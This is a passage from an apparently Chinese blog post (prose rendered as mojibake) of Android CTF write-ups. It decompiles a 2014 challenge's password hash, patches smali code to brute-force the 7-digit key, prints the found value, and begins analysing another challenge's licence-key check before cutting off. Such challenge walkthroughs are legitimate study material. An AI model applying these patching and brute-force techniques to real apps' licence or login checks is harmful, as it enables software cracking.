<span class="type">void</span> <span class="title">ok_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;clicked password: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">    boolean result = Verify.<span class="built_in">isOk</span>(<span class="keyword">this</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>());</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;password is Ok? : &quot;</span> + result);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        Intent i = <span class="keyword">new</span> <span class="built_in">Intent</span>(<span class="keyword">this</span>, (Class&lt;?&gt;) LipSum.<span class="keyword">class</span>);</span><br><span class="line">        Bundle b = <span class="keyword">new</span> <span class="built_in">Bundle</span>();</span><br><span class="line">        b.<span class="built_in">putString</span>(<span class="string">&quot;flag&quot;</span>, <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">toString</span>().<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>));</span><br><span class="line">        i.<span class="built_in">putExtras</span>(b);</span><br><span class="line">        <span class="built_in">startActivity</span>(i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.<span class="built_in">makeText</span>(<span class="keyword">this</span>, R.string.wrong, <span class="number">1</span>).<span class="built_in">show</span>();</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»OKæŒ‰é’®ï¼Œä¼šå…ˆlogè®°å½•å½“å‰çš„passwdï¼Œç„¶åé€šè¿‡Verify.isOkå¯¹å…¶è¿›è¡Œcheckï¼Œå¦‚æœå¯†ç æ­£ç¡®ä¼šè¿›å…¥åˆ°åˆ†æ”¯ï¼Œç„¶åä¼šæŠŠflagæ”¾åˆ°å±å¹•ä¸Šï¼Œæ˜¾ç„¶è¿™å°±æ˜¯èƒœåˆ©æ¡ä»¶äº†</p><p>ç¬¬ä¸€ä¸ªideaï¼Œå¯¹isOkè¿›è¡Œhookï¼Œæµ‹è¯•ä¹‹åå‘ç°ï¼Œä»–çš„flagæ˜¯md5çš„å¯†ç ï¼Œæ˜¾ç„¶å·é¸¡å¤±è´¥ï¼ˆ&#x2F;(ã„’oã„’)&#x2F;~~</p><p>é‚£ä¹ˆå°±è¦ç ”ç©¶isOkå‡½æ•°çš„é€»è¾‘ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> boolean <span class="title">isOk</span><span class="params">(Context c, String _password)</span> </span>&#123;</span><br><span class="line">    String password = _password;</span><br><span class="line">    <span class="keyword">if</span> (_password.<span class="built_in">length</span>() &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        password = _password.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">7</span>); <span class="comment">// åªå–å‰7ä¸ªæ•°å­—</span></span><br><span class="line">    &#125;</span><br><span class="line">    String r = <span class="built_in">OneWayFunction</span>(password);</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;digest: &quot;</span> + password + <span class="string">&quot; =&gt; &quot;</span> + r);</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">equals</span>(<span class="string">&quot;be790d865f2cea9645b3f79c0342df7e&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>passwordåªå–å‰7ä¸ªæ•°å­—è¿›OneWayFunctionå‡½æ•°ï¼Œä¹‹åå°†å…¶è¿”å›çš„å€¼ä¸ä¸€ä¸ªhashè¿›è¡Œæ¯”å¯¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">static</span> String <span class="title">OneWayFunction</span><span class="params">(<span class="keyword">final</span> String password)</span> </span>&#123;</span><br><span class="line">    String[] hashes = &#123;<span class="string">&quot;MD2&quot;</span>, <span class="string">&quot;MD5&quot;</span>, <span class="string">&quot;SHA-1&quot;</span>, <span class="string">&quot;SHA-256&quot;</span>, <span class="string">&quot;SHA-384&quot;</span>, <span class="string">&quot;SHA-512&quot;</span>&#125;;</span><br><span class="line">    List&lt;byte[]&gt; bytes = ArrayTools.<span class="built_in">map</span>(ArrayTools.<span class="built_in">select</span>(ArrayTools.<span class="built_in">map</span>(hashes, <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;String, byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(String element) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(element);</span><br><span class="line">                digest.<span class="built_in">update</span>(password.<span class="built_in">getBytes</span>());</span><br><span class="line">                <span class="keyword">return</span> digest.<span class="built_in">digest</span>();</span><br><span class="line">            &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">SelectAction</span>&lt;byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.2</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.SelectAction</span></span><br><span class="line">            <span class="keyword">public</span> boolean <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            <span class="keyword">return</span> element != null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> <span class="built_in">MapAction</span>&lt;byte[], byte[]&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.Verify.3</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.MapAction</span></span><br><span class="line">            <span class="keyword">public</span> byte[] <span class="built_in">action</span>(byte[] element) &#123;</span><br><span class="line">            byte[] b = <span class="keyword">new</span> byte[<span class="number">8</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                b[i] = element[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; b.length / <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                b[(b.length / <span class="number">2</span>) + i2] = element[(element.length - i2) - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    byte[] b2 = <span class="keyword">new</span> byte[bytes.<span class="built_in">size</span>() * <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b2.length; i++) &#123;</span><br><span class="line">        b2[i] = bytes.<span class="built_in">get</span>(i % bytes.<span class="built_in">size</span>())[i / bytes.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MessageDigest digest = MessageDigest.<span class="built_in">getInstance</span>(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        digest.<span class="built_in">update</span>(b2);</span><br><span class="line">        byte[] messageDigest = digest.<span class="built_in">digest</span>();</span><br><span class="line">        StringBuilder hexString = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte aMessageDigest : messageDigest) &#123;</span><br><span class="line">            String h = Integer.<span class="built_in">toHexString</span>(aMessageDigest &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">while</span> (h.<span class="built_in">length</span>() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                h = <span class="string">&quot;0&quot;</span> + h;</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.<span class="built_in">append</span>(h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.<span class="built_in">toString</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°hashåŸºæœ¬éƒ½æ˜¯å•å‘çš„ï¼Œå‘ç°å¦‚æœåªæ˜¯çˆ†ç ´çš„è¯åªæœ‰10^7çš„å¤§å°ï¼Œæ„Ÿè§‰å¯ä»¥å°è¯•</p><h3 id="æ–¹æ¡ˆ1ï¼š"><a href="#æ–¹æ¡ˆ1ï¼š" class="headerlink" title="æ–¹æ¡ˆ1ï¼š"></a>æ–¹æ¡ˆ1ï¼š</h3><p>ç½‘ä¸Šå¸ˆå‚…çš„æ–¹æ¡ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.line 26</span><br><span class="line">  :cond_0</span><br><span class="line">  const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">  .local v0, &quot;i&quot;:I</span><br><span class="line">  :goto_0</span><br><span class="line">  const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">  if-lt v0, v2, :cond_1</span><br><span class="line"></span><br><span class="line">  .line 38</span><br><span class="line">  return-void</span><br><span class="line"></span><br><span class="line">  .line 28</span><br><span class="line">  :cond_1</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">  move-result v1</span><br><span class="line"></span><br><span class="line">  .line 29</span><br><span class="line">  .local v1, &quot;ok&quot;:Z</span><br><span class="line">  const v2, 0x186a0</span><br><span class="line"></span><br><span class="line">  rem-int v2, v0, v2</span><br><span class="line"></span><br><span class="line">  if-nez v2, :cond_2</span><br><span class="line"></span><br><span class="line">  .line 31</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 33</span><br><span class="line">  :cond_2</span><br><span class="line">  if-eqz v1, :cond_3</span><br><span class="line"></span><br><span class="line">  .line 35</span><br><span class="line">  invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  move-result-object v2</span><br><span class="line"></span><br><span class="line">  invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">  .line 26</span><br><span class="line">  :cond_3</span><br><span class="line">  add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">  goto :goto_0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:cond_0</span><br><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆåˆå§‹åŒ–<code>v0=0</code>ï¼Œç„¶ååˆå§‹åŒ–å¾ªç¯å™¨iï¼ˆå­˜å‚¨åœ¨v0ä¸­ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x98967f       # åŠ è½½æœ€å¤§å€¼ 9,999,999 (0x98967F)</span><br><span class="line">if-lt v0, v2, :cond_1    # å¦‚æœ i &gt;= 9,999,999ï¼Œè·³è½¬åˆ° :cond_1ï¼ˆé€€å‡ºå¾ªç¯ï¼‰</span><br></pre></td></tr></table></figure><p> <code>if v0 less than v2</code>ï¼ˆå³<code>v0&lt;v2</code>ï¼‰å°±ä¼šè·³è½¬åˆ°<code>cond_1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2     # å°† i è½¬ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">invoke-static &#123;v2&#125;, Lcom/example/forloop/MainActivity;-&gt;isOk(Ljava/lang/String;)Z</span><br><span class="line">move-result v1            # è°ƒç”¨ isOk() å¹¶å­˜å‚¨ç»“æœåˆ° v1(ok)</span><br></pre></td></tr></table></figure><p>v0è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åå°†ç»“æœå­˜å‚¨åˆ°v2ï¼Œä¹‹åè°ƒç”¨isOkï¼Œå‚æ•°æ˜¯v2ï¼Œç„¶åå°†è¿”å›å€¼æ”¾å…¥v1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const v2, 0x186a0        # åŠ è½½ 100,000 (0x186A0)</span><br><span class="line">rem-int v2, v0, v2       # è®¡ç®— i % 100,000</span><br><span class="line">if-nez v2, :cond_2       # å¦‚æœä½™æ•°ä¸º0ï¼ˆæ¯100,000æ¬¡ï¼‰ï¼Œæ‰§è¡Œæ‰“å°</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰“å°å½“å‰è¿›åº¦</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p><code>if v2 no equal zero</code>ï¼Œå°±æ˜¯<code>v2!=0</code>å°±ä¼šè·³è½¬åˆ°<code>cond_2</code>æ ‡ç­¾å¤„æ‰§è¡Œï¼Œå¦åˆ™ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:cond_2</span><br><span class="line">if-eqz v1, :cond_3       # å¦‚æœ isOk() è¿”å› trueï¼Œæ‰§è¡ŒæˆåŠŸé€»è¾‘</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰“å°æˆåŠŸçš„æ•°å­—</span></span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-virtual &#123;p0, v2&#125;, Lcom/example/forloop/MainActivity;-&gt;log(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>v1==0</code>å°±ä¼šæ‰“å°æˆåŠŸçš„æ•°å­—ï¼Œè°ƒç”¨çš„æ˜¯logè¿›è¡Œæ‰“å°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:cond_3</span><br><span class="line">add-int/lit8 v0, v0, 0x1  # i++</span><br><span class="line">goto :goto_0              # è·³å›å¾ªç¯å¼€å¤´</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æ»¡è¶³ï¼Œå°±æ‰§è¡Œ<code>i++</code>ç„¶åè·³è½¬å›å»</p><p>ä½†æ˜¯ä¸ºäº†å°†å…¶ç²˜è´´åˆ°apkä¸­å°±è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">const/4 v0, 0x0</span><br><span class="line"></span><br><span class="line">.local v0, &quot;i&quot;:I</span><br><span class="line">:goto_3</span><br><span class="line">const v2, 0x98967f</span><br><span class="line"></span><br><span class="line">if-lt v0, v2, :cond_3</span><br><span class="line">return-void</span><br><span class="line"></span><br><span class="line">.line 28</span><br><span class="line">:cond_3</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;p0, v2&#125;, Lio/asis/ctf2014/numdriod/Verify;-&gt;isOk(Landroid/content/Context;Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v1</span><br><span class="line"></span><br><span class="line">.line 29</span><br><span class="line">.local v1, &quot;ok&quot;:Z</span><br><span class="line"></span><br><span class="line">const v4, 0x186a0</span><br><span class="line"></span><br><span class="line">rem-int v4, v0, v4</span><br><span class="line"></span><br><span class="line">if-nez v4, :cond_6</span><br><span class="line"></span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">:cond_6</span><br><span class="line"></span><br><span class="line">if-eqz v1, :cond_2</span><br><span class="line"></span><br><span class="line">goto :goto_4</span><br><span class="line">.line 31</span><br><span class="line">invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">move-result-object v2</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v2&#125;, Lio/asis/ctf2014/numdriod/tools/DebugTools;-&gt;log(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">.line 26</span><br><span class="line">:cond_2</span><br><span class="line">add-int/lit8 v0, v0, 0x1</span><br><span class="line"></span><br><span class="line">goto :goto_3</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ¡ˆ2ï¼š"><a href="#æ–¹æ¡ˆ2ï¼š" class="headerlink" title="æ–¹æ¡ˆ2ï¼š"></a>æ–¹æ¡ˆ2ï¼š</h3><p>è¿™ä¸ªæ–¹æ¡ˆæ˜¯ç›´æ¥å°†Verifyä¸­åŠ ä¸ªmainå‡½æ•°ï¼Œç„¶åä¿®æ”¹ä¸€äº›æŠ¥é”™ï¼Œç›´æ¥è¿è¡Œå³å¯ï¼Œå‚ç…§<a href="https://gist.github.com/volpino/2edea8503822aefb4c9e">https://gist.github.com/volpino/2edea8503822aefb4c9e</a></p><p>å¾—åˆ°ç­”æ¡ˆæ˜¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">................&gt; java .\sample\Verify.java</span><br><span class="line">FOUND!! 3130110</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504141456731.png" alt="image-20250330220516717" style="zoom:50%;" /><h2 id="2014-Sharif-University-Quals-CTF-Commercial-Application"><a href="#2014-Sharif-University-Quals-CTF-Commercial-Application" class="headerlink" title="2014 Sharif University Quals CTF Commercial Application"></a>2014 Sharif University Quals CTF Commercial Application</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">void</span> <span class="title">checkLicenceKey</span><span class="params">(<span class="keyword">final</span> Context context)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">hasLicence</span>()) &#123; <span class="comment">// å¦‚æœæ²¡æœ‰æœ‰æ•ˆè®¸å¯è¯</span></span><br><span class="line">          <span class="built_in">showAlertDialog</span>(context, OK_LICENCE_MSG);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      LayoutInflater li = LayoutInflater.<span class="built_in">from</span>(context);</span><br><span class="line">      View promptsView = li.<span class="built_in">inflate</span>(R.layout.propmt, (ViewGroup) null);</span><br><span class="line">      AlertDialog.Builder alertDialogBuilder = <span class="keyword">new</span> AlertDialog.<span class="built_in">Builder</span>(context);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setView</span>(promptsView);</span><br><span class="line">      <span class="keyword">final</span> EditText userInput = (EditText) promptsView.<span class="built_in">findViewById</span>(R.id.editTextDialogUserInput);</span><br><span class="line">      alertDialogBuilder.<span class="built_in">setCancelable</span>(<span class="literal">false</span>).<span class="built_in">setPositiveButton</span>(<span class="string">&quot;Continue&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.4</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              String userEnteredValue = userInput.<span class="built_in">getText</span>().<span class="built_in">toString</span>();</span><br><span class="line">              String storedKey = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityKey</span>();</span><br><span class="line">              String iv = MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">getConfig</span>().<span class="built_in">getSecurityIv</span>();</span><br><span class="line">              boolean licenceKeyIsValid = KeyVerifier.<span class="built_in">isValidLicenceKey</span>(userEnteredValue, storedKey, iv);</span><br><span class="line">              <span class="keyword">if</span> (licenceKeyIsValid) &#123;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.app.<span class="built_in">getDataHelper</span>().<span class="built_in">updateLicence</span>(<span class="number">2014</span>);</span><br><span class="line">                  MainActivity.isRegisterd = <span class="literal">true</span>;</span><br><span class="line">                  MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.OK_LICENCE_MSG);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              MainActivity.<span class="keyword">this</span>.<span class="built_in">showAlertDialog</span>(context, MainActivity.NOK_LICENCE_MSG);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;).<span class="built_in">setNegativeButton</span>(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: edu.sharif.ctf.activities.MainActivity.5</span></span><br><span class="line">          @Override <span class="comment">// android.content.DialogInterface.OnClickListener</span></span><br><span class="line">          <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(DialogInterface dialog, <span class="type">int</span> id) &#123;</span><br><span class="line">              dialog.<span class="built_in">cancel</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      AlertDialog inputLicenceDialog = alertDialogBuilder.<span class="built_in">create</span>();</span><br><span class="line">      inputLicenceDialog.<span class="built_in">show</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…³é”®å‡½æ•°ï¼Œå¤„ç†keyè¿‡ç¨‹å¦‚ä¸‹</p><p>æŒ‰ä¸‹continueä¹‹åï¼Œusrinputä¼šè¢«è½¬ä¸ºstringè¿›å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userEnteredValue</span> <span class="operator">=</span> userInput.getText().toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">storedKey</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityKey();</span><br><span class="line"><span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.app.getDataHelper().getConfig().getSecurityIv();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">licenceKeyIsValid</span> <span class="operator">=</span> KeyVerifier.isValidLicenceKey(userEnteredValue, storedKey, 